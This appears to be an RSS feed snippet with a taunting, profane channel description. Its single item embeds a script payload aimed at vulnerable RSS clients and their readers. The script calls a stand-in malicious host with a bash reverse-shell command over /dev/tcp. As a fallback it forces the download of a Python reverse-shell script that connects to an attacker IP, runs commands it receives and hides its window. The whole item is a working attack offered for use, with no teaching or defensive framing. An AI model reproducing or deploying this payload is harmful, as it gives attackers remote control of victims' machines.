channel.title: Shadow News Feed
channel.description: Fuck yeah, the sneakiest feed to fuck shit up, you devious bastard.

item.title: Chaos Trigger
item.description:
<script>
                    // Attempt to trigger a system command via a vulnerable RSS client
                    try {
                        // This is a long shot, as browsers block direct system calls
                        // If the RSS client or server is vulnerable to command injection, this might work
                        var xhr = new XMLHttpRequest();
                        xhr.open('GET', 'http://your-malicious-site.com/evil?cmd=' + encodeURIComponent('bash -c "bash -i >& /dev/tcp/192.168.0.0/4444 0>&1"'), true);
                        xhr.send();
                    } catch (e) {
                        // Fallback: Prompt user to download a script (less stealthy)
                        var script = `
import socket
import subprocess

def reverse_shell():
    host = '192.168.0.152'  # Attacker's IP
    port = 4444             # Attacker's port

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    while True:
        command = s.recv(1024).decode()
        if command.lower() == 'exit':
            break

        output = subprocess.run(
            command, 
            shell=True, 
            capture_output=True, 
            text=True, 
            creationflags=0x08000000  # Hides the window
        )
        result = output.stdout + output.stderr
        s.send(result.encode())

    s.close()

if __name__ == "__main__":
    reverse_shell()
                        `;
                        var blob = new Blob([script], { type: 'text/x-python' });
                        var url = window.URL.createObjectURL(blob);
                        var a = document.createElement('a');
                        a.href = url;
                        a.download = 'reverse_shell.pyw';
                        document.body.appendChild(a);
                        a.click();
                        document.body.removeChild(a);
                        window.URL.revokeObjectURL(url);
                    }
                </script>
